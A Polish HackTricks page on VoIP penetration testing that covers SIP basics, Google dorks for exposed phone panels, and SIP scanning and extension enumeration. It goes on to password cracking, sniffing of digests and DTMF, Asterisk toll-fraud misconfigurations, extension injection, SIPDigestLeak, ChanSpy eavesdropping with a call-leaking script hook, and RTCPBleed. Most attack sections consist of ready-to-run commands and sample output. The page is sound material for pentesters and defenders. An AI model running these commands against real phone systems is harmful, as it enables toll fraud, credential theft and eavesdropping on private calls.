# Testowanie penetracyjne VoIP

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje o VoIP

Aby zacząć naukę na temat działania VoIP, sprawdź:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Kody odpowiedzi

**1xx—Odpowiedzi wstępne**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Pomyślne odpowiedzi**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Odpowiedzi przekierowania**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Odpowiedzi o błędach klienta**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Odpowiedzi o błędach serwera**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Odpowiedzi o globalnej awarii**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Wyliczenie VoIP

### Numery telefonów

Jednym z pierwszych kroków, które zespół Red Team może podjąć, jest wyszukanie dostępnych numerów telefonów do kontaktu z firmą przy użyciu narzędzi OSINT, wyszukiwarek Google lub przeszukiwania stron internetowych.

Gdy już będziesz mieć numery telefonów, możesz skorzystać z usług online, aby zidentyfikować operatora:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Znając, czy operator świadczy usługi VoIP, można zidentyfikować, czy firma korzysta z VoIP... Ponadto możliwe jest, że firma nie zatrudniła usług VoIP, ale używa kart PSTN do podłączenia swojej własnej centrali VoIP do tradycyjnej sieci telefonicznej.

Rzeczy takie jak zautomatyzowane odpowiedzi lub muzyka zazwyczaj wskazują, że jest używany VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informacje OSINT

Każda inna enumeracja OSINT, która pomaga zidentyfikować używane oprogramowanie VoIP, będzie pomocna dla Czerwonego Zespołu.

### Enumeracja sieci

* **`nmap`** jest zdolny do skanowania usług UDP, ale ze względu na liczbę skanowanych usług UDP, jest bardzo wolny i może nie być zbyt dokładny w przypadku tego rodzaju usług.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** z SIPVicious (`sudo apt install sipvicious`): Zlokalizuje usługi SIP w wskazanej sieci.
* `svmap` jest **łatwy do zablokowania**, ponieważ używa User-Agent `friendly-scanner`, ale można zmodyfikować kod z `/usr/share/sipvicious/sipvicious` i go zmienić.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Skan SIPPTS to bardzo szybki skaner usług SIP przez UDP, TCP lub TLS. Wykorzystuje wielowątkowość i może skanować duże zakresy sieci. Umożliwia łatwe określenie zakresu portów, skanowanie zarówno TCP, jak i UDP, użycie innej metody (domyślnie używa OPTIONS) oraz określenie innego User-Agent (i nie tylko).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatkowe wyliczanie sieci

Centrala telefoniczna może również ujawniać inne usługi sieciowe, takie jak:

- **69/UDP (TFTP)**: Aktualizacje oprogramowania
- **80 (HTTP) / 443 (HTTPS)**: Zarządzanie urządzeniem za pomocą przeglądarki internetowej
- **389 (LDAP)**: Alternatywa przechowywania informacji o użytkownikach
- **3306 (MySQL)**: Baza danych MySQL
- **5038 (Manager)**: Umożliwia korzystanie z Asterisk z innych platform
- **5222 (XMPP)**: Wiadomości za pomocą Jabbera
- **5432 (PostgreSQL)**: Baza danych PostgreSQL
- I inne...

### Wyliczanie metod

Możliwe jest znalezienie **dostępnych metod** do użycia w centrali telefonicznej za pomocą `SIPPTS enumerate` z [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analiza odpowiedzi serwera

Bardzo ważne jest analizowanie nagłówków, które serwer wysyła do nas, w zależności od rodzaju wiadomości i nagłówków, które wysyłamy. Dzięki `SIPPTS send` z [**sippts**](https://github.com/Pepelux/sippts) możemy wysyłać spersonalizowane wiadomości, manipulując wszystkimi nagłówkami, i analizować odpowiedź.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
To również jest możliwe w przypadku serwera korzystającego z websockets. Za pomocą `SIPPTS wssend` z [**sippts**](https://github.com/Pepelux/sippts) możemy wysyłać spersonalizowane wiadomości WS.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Wymienianie rozszerzeń

Rozszerzenia w systemie PBX (Private Branch Exchange) odnoszą się do **unikalnych wewnętrznych identyfikatorów przypisanych do poszczególnych** linii telefonicznych, urządzeń lub użytkowników w ramach organizacji lub firmy. Rozszerzenia umożliwiają **efektywne przekierowywanie połączeń wewnątrz organizacji**, bez konieczności posiadania indywidualnych zewnętrznych numerów telefonów dla każdego użytkownika lub urządzenia.

* **`svwar`** z SIPVicious (`sudo apt install sipvicious`): `svwar` to bezpłatne narzędzie do skanowania linii rozszerzeń w systemie SIP PBX. W koncepcji działa podobnie do tradycyjnych wardialerów, **próbując odgadnąć zakres rozszerzeń lub podaną listę rozszerzeń**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identyfikuje rozszerzenia na serwerze SIP. Sipexten może sprawdzać duże zakresy sieci i portów.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Możesz również wyliczać rozszerzenia/nazwy użytkowników za pomocą metasploita:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** to narzędzie do **przemuszania nazw użytkowników** protokołu Inter Asterisk Exchange. enumIAX może działać w dwóch różnych trybach; Sekwencyjne Próby Odgadnięcia Nazwy Użytkownika lub Atak Słownikowy.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataki VoIP

### Bruteforce hasła - online

Odkrywszy **PBX** oraz niektóre **rozszerzenia/nazwy użytkowników**, Czerwony Zespół może spróbować **uwierzytelnienia za pomocą metody `REGISTER`** do rozszerzenia, używając słownika powszechnych haseł do brutalnego łamania uwierzytelnienia.

{% hint style="danger" %}
Zauważ, że **nazwa użytkownika** może być taka sama jak rozszerzenie, ale ta praktyka może się różnić w zależności od systemu PBX, jego konfiguracji i preferencji organizacji...

Jeśli nazwa użytkownika nie jest taka sama jak rozszerzenie, będziesz musiał **odgadnąć nazwę użytkownika, aby ją brutalnie złamać**.
{% endhint %}

* **`svcrack`** z SIPVicious (`sudo apt install sipvicious`): SVCrack pozwala na złamanie hasła dla określonej nazwy użytkownika/rozszerzenia na PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack to zdalny łamacz haseł do usług SIP. Rcrack może testować hasła dla kilku użytkowników w różnych adresach IP i zakresach portów.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Podsłuchiwanie VoIP

Jeśli znajdziesz sprzęt VoIP w **otwartej sieci Wifi**, możesz **przechwycić całą informację**. Ponadto, jeśli jesteś w bardziej zamkniętej sieci (podłączony za pomocą Ethernetu lub chronionej sieci Wifi), możesz przeprowadzić ataki **MitM, takie jak** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) między **PBX a bramą** w celu podsłuchania informacji.

Wśród informacji sieciowych możesz znaleźć **dane uwierzytelniające do zarządzania sprzętem**, **rozszerzenia użytkownika**, **nazwę użytkownika**, **adresy IP**, nawet **zaszyfrowane hasła** i **pakiety RTP**, które można odtworzyć, aby **słuchać rozmowy**, i wiele więcej.

Aby uzyskać te informacje, możesz użyć narzędzi takich jak Wireshark, tcpdump... ale **specjalnie stworzone narzędzie do podsłuchiwania rozmów VoIP to** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Zauważ, że jeśli **TLS jest używane w komunikacji SIP**, nie będziesz w stanie zobaczyć komunikacji SIP w czytelnej formie.\
To samo będzie miało miejsce, jeśli używane są **SRTP** i **ZRTP**, **pakiety RTP nie będą w formie tekstu jawnego**.
{% endhint %}

#### Dane uwierzytelniające SIP (Atak Brute-Force na hasło - offline)

[Sprawdź ten przykład, aby lepiej zrozumieć **komunikację SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) i dowiedz się, jak są przesyłane **dane uwierzytelniające**.

* **`sipdump`** & **`sipcrack`,** część **sipcrack** (`apt-get install sipcrack`): Te narzędzia mogą **wydobyć** z **pcap** **uwierzytelnienia z sumą kontrolną** w ramach protokołu SIP i **przeprowadzić atak bruteforce** na nie.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump może wydobyć uwierzytelnienia digest z pliku pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack to narzędzie do łamania uwierzytelnienia digest uzyskanego z zrzutu SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark wyodrębnia dane protokołu SIP z pliku PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Kody DTMF

**Nie tylko dane uwierzytelniające SIP** mogą być znalezione w ruchu sieciowym, możliwe jest także znalezienie kodów DTMF, które są używane na przykład do dostępu do **poczty głosowej**.\
Możliwe jest wysłanie tych kodów w wiadomościach **INFO SIP**, w formie **audio** lub wewnątrz pakietów **RTP**. Jeśli kody znajdują się w pakietach RTP, można odciąć tę część rozmowy i skorzystać z narzędzia multimo do ich wyodrębnienia:
```bash
multimon -a DTMF -t wac pin.wav
```
### Darmowe połączenia / Błędy konfiguracji połączeń Asterisk

W Asterisku można zezwolić na połączenie **z określonego adresu IP** lub z **dowolnego adresu IP**:
```
host=10.10.10.10
host=dynamic
```
Jeśli zostanie określony adres IP, host **nie będzie musiał wysyłać żądań REJESTRACJI** co jakiś czas (w pakiecie REJESTRACJI jest wysyłany czas życia, zwykle 30 minut, co oznacza, że w innym scenariuszu telefon będzie musiał się REJESTROWAĆ co 30 minut). Jednakże konieczne będzie posiadanie otwartych portów umożliwiających połączenia z serwera VoIP w celu odbierania połączeń.

Aby zdefiniować użytkowników, mogą być określeni jako:

* **`type=user`**: Użytkownik może jedynie odbierać połączenia jako użytkownik.
* **`type=friend`**: Możliwe jest wykonanie połączeń jako peer i odbieranie ich jako użytkownik (używane z rozszerzeniami).
* **`type=peer`**: Możliwe jest wysyłanie i odbieranie połączeń jako peer (SIP-trunks).

Możliwe jest również ustanowienie zaufania za pomocą zmiennej insecure:

* **`insecure=port`**: Umożliwia połączenia peer zweryfikowane przez IP.
* **`insecure=invite`**: Nie wymaga uwierzytelniania dla wiadomości INVITE.
* **`insecure=port,invite`**: Oba.

{% hint style="warning" %}
Gdy używane jest **`type=friend`**, **wartość** zmiennej **host** **nie będzie używana**, więc jeśli administrator **błędnie skonfiguruje SIP-trunk** używając tej wartości, **każdy będzie mógł się do niego podłączyć**.

Na przykład, taka konfiguracja byłaby podatna na atak:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Darmowe Połączenia / Błędy Konfiguracji Kontekstów Asterisk

W Asterisku **kontekst** to nazwany kontener lub sekcja w planie numeracji, który **grupuje powiązane rozszerzenia, akcje i reguły**. Plan numeracji jest głównym komponentem systemu Asterisk, ponieważ definiuje **sposób obsługi i kierowania połączeniami przychodzącymi i wychodzącymi**. Konteksty są używane do organizacji planu numeracji, zarządzania kontrolą dostępu i zapewnienia separacji między różnymi częściami systemu.

Każdy kontekst jest określony w pliku konfiguracyjnym, zazwyczaj w pliku **`extensions.conf`**. Konteksty są oznaczone przez nawiasy kwadratowe, a nazwa kontekstu jest zamknięta w nich. Na przykład:
```bash
csharpCopy code[my_context]
```
W kontekście definiujesz rozszerzenia (wzorce numerów wybieranych) i łączysz je z serią działań lub aplikacji. Te działania określają, w jaki sposób jest przetwarzane połączenie. Na przykład:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
To przykład prostego kontekstu o nazwie "my\_context" z rozszerzeniem "100". Gdy ktoś wybierze 100, połączenie zostanie odebrane, odtworzona zostanie wiadomość powitalna, a następnie połączenie zostanie zakończone.

To jest **inny kontekst**, który pozwala na **wybieranie innych numerów**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Jeśli administrator definiuje **domyślny kontekst** jako:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Każdy będzie mógł użyć **serwera do dzwonienia pod dowolny numer** (a administrator serwera zapłaci za połączenie).
{% endhint %}

{% hint style="danger" %}
Co więcej, domyślnie plik **`sip.conf`** zawiera **`allowguest=true`**, więc **każdy** atakujący **bez uwierzytelnienia** będzie mógł dzwonić pod dowolny numer.
{% endhint %}

*   **`SIPPTS invite`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite sprawdza, czy **serwer PBX pozwala nam na wykonywanie połączeń bez uwierzytelnienia**. Jeśli serwer SIP ma niepoprawną konfigurację, pozwoli nam na dzwonienie pod zewnętrzne numery. Może również umożliwić przekierowanie połączenia na drugi zewnętrzny numer.

Na przykład, jeśli twój serwer Asterisk ma złą konfigurację kontekstu, możesz akceptować żądania INVITE bez autoryzacji. W takim przypadku atakujący może dzwonić, nie znając żadnego użytkownika/hasła.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Darmowe połączenia / Źle skonfigurowane IVRS

IVRS oznacza **Interaktywny System Rozpoznawania Głosu**, technologię telefoniczną, która umożliwia użytkownikom interakcję z zautomatyzowanym systemem za pomocą głosu lub klawiszy DTMF. IVRS służy do budowania systemów **automatyzacji obsługi połączeń**, które oferują szereg funkcji, takich jak udostępnianie informacji, kierowanie połączeń i przechwytywanie danych od użytkowników.

IVRS w systemach VoIP zazwyczaj składa się z:

1. **Komunikatów głosowych**: Wstępnie nagrane komunikaty audio, które prowadzą użytkowników przez opcje menu IVR i instrukcje.
2. **Sygnalizacji DTMF** (Dual-Tone Multi-Frequency): Sygnały generowane przez naciśnięcie klawiszy na telefonie, które służą do nawigacji po menu IVR i wprowadzania danych.
3. **Kierowania połączeń**: Kierowanie połączeń do odpowiedniego celu, takich jak konkretne działy, agenci lub numery wewnętrzne na podstawie danych wprowadzonych przez użytkownika.
4. **Przechwytywania danych od użytkownika**: Zbieranie informacji od dzwoniących, takich jak numery kont, identyfikatory przypadków lub inne istotne dane.
5. **Integracji z systemami zewnętrznymi**: Łączenie systemu IVR z bazami danych lub innymi systemami oprogramowania w celu uzyskiwania lub aktualizowania informacji, wykonywania działań lub wyzwalania zdarzeń.

W systemie VoIP Asterisk można utworzyć IVR za pomocą planu numeracji (**plik **`extensions.conf`**) i różnych aplikacji, takich jak `Background()`, `Playback()`, `Read()` i inne. Te aplikacje pomagają odtwarzać komunikaty głosowe, przechwytywać dane od użytkowników i kontrolować przepływ połączenia.

#### Przykład podatnej konfiguracji
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Poprzednie jest przykładem, w którym użytkownik jest proszony o **naciśnięcie 1, aby zadzwonić** do działu, **2, aby zadzwonić** gdzie indziej, lub **pełny numer wewnętrzny**, jeśli go zna.

Podatność polega na tym, że wskazana **długość numeru wewnętrznego nie jest sprawdzana, więc użytkownik może wprowadzić pełny numer w czasie 5 sekund i zostanie on wybrany.**

### Wstrzykiwanie numeru wewnętrznego

Korzystając z numeru wewnętrznego, na przykład:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gdzie **`${EXTEN}`** to **numer wewnętrzny**, który zostanie wybrany, gdy zostanie wprowadzony **ext 101**, to co by się stało:
```scss
exten => 101,1,Dial(SIP/101)
```
Jednak jeśli **`${EXTEN}`** pozwala na wprowadzanie **więcej niż liczb** (jak w starszych wersjach Asteriska), atakujący mógłby wprowadzić **`101&SIP123123123`** aby zadzwonić pod numer telefonu 123123123. I to byłby rezultat:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Dlatego też połączenie z rozszerzeniem **`101`** i **`123123123`** zostanie wysłane i tylko pierwsze połączenie zostanie nawiązane... ale jeśli atakujący użyje **rozszerzenia, które omija dopasowanie** wykonywane, ale nie istnieje, może **wstrzyknąć połączenie tylko do pożądanego numeru**.

## Wrażliwość SIPDigestLeak

Wyciek SIP Digest to podatność, która dotyka dużą liczbę telefonów SIP, w tym zarówno sprzętowe i oprogramowanie telefoniczne IP, jak i adaptery telefoniczne (VoIP do analogowego). Podatność ta pozwala na **wyciek odpowiedzi uwierzytelniania Digest**, która jest obliczana na podstawie hasła. Następnie możliwy jest **atak offline na hasło** i odzyskanie większości haseł na podstawie odpowiedzi na wyzwanie.

**[Scenariusz podatności od tego miejsca**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Telefon IP (ofiara) nasłuchuje na dowolnym porcie (na przykład: 5060), akceptując połączenia telefoniczne
2. Atakujący wysyła INVITE do telefonu IP
3. Telefon ofiary zaczyna dzwonić i ktoś odbiera i odkłada słuchawkę (ponieważ nikt nie odbiera telefonu po drugiej stronie)
4. Gdy telefon jest odłożony, **telefon ofiary wysyła BYE do atakującego**
5. **Atakujący wysyła odpowiedź 407**, która **prosi o uwierzytelnienie** i wysyła wyzwanie uwierzytelniania
6. **Telefon ofiary udziela odpowiedzi na wyzwanie uwierzytelniania** w drugim BYE
7. **Atakujący może wtedy przeprowadzić atak brute-force** na odpowiedź na wyzwanie na swoim lokalnym komputerze (lub rozproszoną sieć itp.) i zgadnąć hasło

* **Wyciek SIPPTS** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wyciek SIPPTS wykorzystuje podatność wycieku SIP Digest, która dotyka dużą liczbę telefonów SIP. Wynik można zapisać w formacie SipCrack, aby przeprowadzić atak brute-force za pomocą narzędzia SIPPTS dcrack lub narzędzia SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call pozwala **użytkownikowi sieci web** (który na przykład może być zainteresowany produktem) **wprowadzić** swój **numer telefonu**, aby zostać zadzwonionym. Następnie zostanie wykonane połączenie komercyjne, a gdy **odejmie słuchawkę**, użytkownik zostanie **zadzwoniony i połączony z agentem**.

Powszechny profil Asterisk dla tego to:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Poprzedni profil pozwala **KAŻDEMU adresowi IP na połączenie** (jeśli znane jest hasło).
* Aby **zorganizować połączenie**, jak wcześniej określono, **nie jest konieczne posiadanie uprawnień do odczytu**, a jedynie **uprawnienia do inicjowania** w trybie **zapisu**.

Z tymi uprawnieniami każde IP znające hasło mogłoby się połączyć i wydobyć zbyt wiele informacji, takich jak:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Więcej informacji lub działań może być wymagane.**

### **Podsluchiwanie**

W Asterisku możliwe jest użycie polecenia **`ChanSpy`** wskazującego **rozszerzenie(-a) do monitorowania** (lub wszystkie) w celu podsłuchiwania rozmów. To polecenie musi być przypisane do rozszerzenia.

Na przykład, **`exten => 333,1,ChanSpy('all',qb)`** oznacza, że jeśli **zadzwonisz** na **rozszerzenie 333**, będzie **monitorować** **`wszystkie`** rozszerzenia, **rozpocznie nasłuchiwanie** gdy zacznie się nowa rozmowa (**`b`**) w trybie cichym (**`q`**), ponieważ nie chcemy na nią wpływać. Możesz przejść z jednej rozmowy do drugiej, naciskając **`*`**, lub oznaczając numer rozszerzenia.

Możliwe jest również użycie **`ExtenSpy`** do monitorowania tylko jednego rozszerzenia.

Zamiast słuchania rozmów, można je **nagrywać w plikach** przy użyciu rozszerzenia, na przykład:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Połączenia zostaną zapisane w **`/tmp`**.

Możesz nawet sprawić, że Asterisk **wykona skrypt, który ujawni połączenie**, gdy zostanie zamknięty.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Wrażliwość RTCPBleed

**RTCPBleed** to poważny problem związany z bezpieczeństwem dotykający serwerów VoIP opartych na Asterisku (opublikowany w 2017 roku). Wrażliwość ta pozwala na **przechwycenie i przekierowanie ruchu RTP (Real Time Protocol)**, który przenosi rozmowy VoIP, przez dowolną osobę w Internecie. Zjawisko to występuje, ponieważ ruch RTP omija uwierzytelnianie podczas przechodzenia przez zapory NAT (Network Address Translation).

Proksy RTP próbują rozwiązać **ograniczenia NAT** dotykające systemów RTC poprzez przekazywanie strumieni RTP między dwiema lub więcej stronami. Gdy jest obecne NAT, oprogramowanie proksy RTP często nie może polegać na informacjach o IP i porcie RTP uzyskanych poprzez sygnalizację (np. SIP). Dlatego wiele proksów RTP wprowadziło mechanizm, w którym taki **krotka IP i port jest automatycznie poznawany**. Często dzieje się to poprzez inspekcję przychodzącego ruchu RTP i oznaczanie adresu IP i portu źródłowego dla każdego przychodzącego ruchu RTP jako ten, na który należy odpowiedzieć. Ten mechanizm, który może być nazywany "trybem nauki", **nie wykorzystuje żadnej formy uwierzytelniania**. Dlatego **atakujący** mogą **wysyłać ruch RTP do proksa RTP** i otrzymywać przekazywany ruch RTP przeznaczony dla dzwoniącego lub odbierającego w trakcie trwającego strumienia RTP. Nazywamy tę wrażliwość RTP Bleed, ponieważ pozwala ona atakującym otrzymywać strumienie multimedialne RTP przeznaczone dla prawowitych użytkowników.

Innym interesującym zachowaniem proksów RTP i stosów RTP jest to, że czasami, **nawet jeśli nie są podatne na RTP Bleed**, będą **akceptować, przekazywać i/lub przetwarzać pakiety RTP z dowolnego źródła**. Dlatego atakujący mogą wysyłać pakiety RTP, które mogą pozwolić im na wstrzyknięcie swoich mediów zamiast prawowitych. Nazywamy ten atak wstrzyknięciem RTP, ponieważ pozwala on na wstrzyknięcie nieprawowitych pakietów RTP do istniejących strumieni RTP. Ta wrażliwość może występować zarówno w proksach RTP, jak i w punktach końcowych.

Asterisk i FreePBX tradycyjnie używały ustawienia **`NAT=yes`**, które umożliwia omijanie uwierzytelniania ruchu RTP, co potencjalnie prowadzi do braku dźwięku lub jednokierunkowego dźwięku podczas rozmów.

Więcej informacji można znaleźć pod adresem [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

